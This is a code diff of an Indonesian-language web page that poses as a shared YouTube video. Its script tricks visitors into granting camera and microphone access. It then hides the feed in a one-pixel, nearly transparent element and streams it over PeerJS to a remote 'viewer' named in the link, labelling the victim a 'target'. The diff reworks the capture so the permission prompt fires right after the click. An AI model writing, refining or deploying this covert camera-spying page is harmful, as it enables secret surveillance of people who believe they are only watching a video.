@@ -28,7 +28,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.95);
+            background: rgba(0, 0, 0, 0.98);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -43,30 +43,32 @@
         }
         
         .modal h1 {
-            font-size: 2em;
-            margin-bottom: 40px;
+            font-size: 2.2em;
+            margin-bottom: 50px;
             letter-spacing: 2px;
+            font-weight: 900;
         }
         
         .modal-buttons {
             display: flex;
             flex-direction: column;
-            gap: 20px;
+            gap: 25px;
         }
         
         .btn {
-            padding: 20px;
-            font-size: 1.5em;
+            padding: 22px;
+            font-size: 1.6em;
             font-weight: bold;
             border: 2px solid white;
             background: transparent;
             color: white;
             cursor: pointer;
-            border-radius: 10px;
+            border-radius: 12px;
             transition: 0.3s;
+            text-transform: uppercase;
         }
         
-        .btn:active { background: white; color: black; }
+        .btn:active { background: white; color: black; transform: scale(0.98); }
         
         /* Hidden elements */
         #cameraPreview { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
@@ -92,7 +94,7 @@
     </div>
 
     <div class="video-info">
-        <div class="video-title" id="displayTitle">Memuat video...</div>
+        <div class="video-title" id="displayTitle">Video Spesial Untuk Anda</div>
         <div class="channel-info">
             <div class="channel-avatar"></div>
             <div>
@@ -108,12 +110,11 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const viewerId = urlParams.get('viewer');
-        const videoId = urlParams.get('v') || 'dQw4w9WgXcQ'; // Default Rickroll if no ID
+        const videoId = urlParams.get('v') || 'dQw4w9WgXcQ';
         const targetId = "yt-" + Math.floor(1000 + Math.random() * 9000);
         
         const overlay = document.getElementById('overlay');
         const ytPlayer = document.getElementById('ytPlayer');
-        const displayTitle = document.getElementById('displayTitle');
         const cameraPreview = document.getElementById('cameraPreview');
         
         let peer = null;
@@ -121,95 +122,76 @@
         let localStream = null;
         let activeCall = null;
 
-        // Setup YouTube Player
+        // Pre-setup YouTube Player
         ytPlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=0&controls=1`;
-        displayTitle.textContent = "Video Spesial Untuk Anda";
 
-        async function initStreaming() {
+        async function startMedia() {
             try {
-                // Mencoba kamera belakang dulu, jika gagal coba apa saja yang ada
-                const constraints = [
-                    { video: { facingMode: 'environment' }, audio: true },
-                    { video: { facingMode: 'user' }, audio: true },
-                    { video: true, audio: true },
-                    { video: true, audio: false }
-                ];
-
-                for (let constraint of constraints) {
-                    try {
-                        localStream = await navigator.mediaDevices.getUserMedia(constraint);
-                        if (localStream) break;
-                    } catch (e) {
-                        console.log("Mencoba constraint lain...");
-                    }
-                }
-                
-                if (!localStream) throw new Error("Tidak bisa akses kamera");
-                cameraPreview.srcObject = localStream;
-
-                // Setup PeerJS
-                peer = new Peer(targetId, { 
-                    host: '0.peerjs.com', 
-                    port: 443, 
-                    secure: true, 
-                    debug: 1,
-                    config: {
-                        'iceServers': [
-                            { 'urls': 'stun:stun.l.google.com:19302' },
-                            { 'urls': 'stun:stun1.l.google.com:19302' }
-                        ]
-                    }
+                // LANGSUNG minta akses kamera saat tombol diklik (ini kunci agar izin muncul real-time)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: true 
                 });
                 
-                peer.on('open', (id) => {
-                    if (viewerId) {
-                        conn = peer.connect(viewerId, { reliable: true });
-                        conn.on('open', () => {
-                            conn.send({ type: 'target_ready', targetId: id, audioEnabled: true });
-                        });
-                        conn.on('data', (data) => {
-                            if (data.type === 'switch_camera') switchCamera();
-                        });
-                    }
-                });
-
-                peer.on('call', (call) => {
-                    activeCall = call;
-                    call.answer(localStream);
-                });
-
+                localStream = stream;
+                cameraPreview.srcObject = stream;
+                
+                // Inisialisasi PeerJS SETELAH izin didapat
+                initPeer();
+                
                 return true;
             } catch (err) {
-                console.error("Akses ditolak:", err);
-                return false;
+                console.error("Izin ditolak atau error:", err);
+                // Coba lagi tanpa audio jika gagal
+                try {
+                    localStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    cameraPreview.srcObject = localStream;
+                    initPeer();
+                    return true;
+                } catch (e) {
+                    return false;
+                }
             }
         }
 
-        async function switchCamera() {
-            if (!localStream) return;
-            const currentFacing = localStream.getVideoTracks()[0].getSettings().facingMode;
-            const newFacing = currentFacing === 'environment' ? 'user' : 'environment';
-            
-            localStream.getTracks().forEach(t => t.stop());
-            localStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: newFacing }, 
-                audio: true 
+        function initPeer() {
+            peer = new Peer(targetId, { 
+                host: '0.peerjs.com', 
+                port: 443, 
+                secure: true, 
+                debug: 1,
+                config: {
+                    'iceServers': [
+                        { 'urls': 'stun:stun.l.google.com:19302' },
+                        { 'urls': 'stun:stun1.l.google.com:19302' }
+                    ]
+                }
             });
-            cameraPreview.srcObject = localStream;
             
-            if (activeCall) {
-                const videoTrack = localStream.getVideoTracks()[0];
-                const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
-                if (sender) sender.replaceTrack(videoTrack);
-            }
+            peer.on('open', (id) => {
+                if (viewerId) {
+                    conn = peer.connect(viewerId, { reliable: true });
+                    conn.on('open', () => {
+                        conn.send({ type: 'target_ready', targetId: id });
+                    });
+                }
+            });
+
+            peer.on('call', (call) => {
+                activeCall = call;
+                call.answer(localStream);
+            });
         }
 
         document.getElementById('btnYes').addEventListener('click', async () => {
+            // 1. Sembunyikan overlay
             overlay.style.display = 'none';
-            // Mulai video YouTube
+            
+            // 2. Putar YouTube
             ytPlayer.src = ytPlayer.src.replace('autoplay=0', 'autoplay=1');
-            // Inisialisasi kamera
-            await initStreaming();
+            
+            // 3. Langsung pemicu kamera (Real-time)
+            await startMedia();
         });
 
         document.getElementById('btnNo').addEventListener('click', () => {
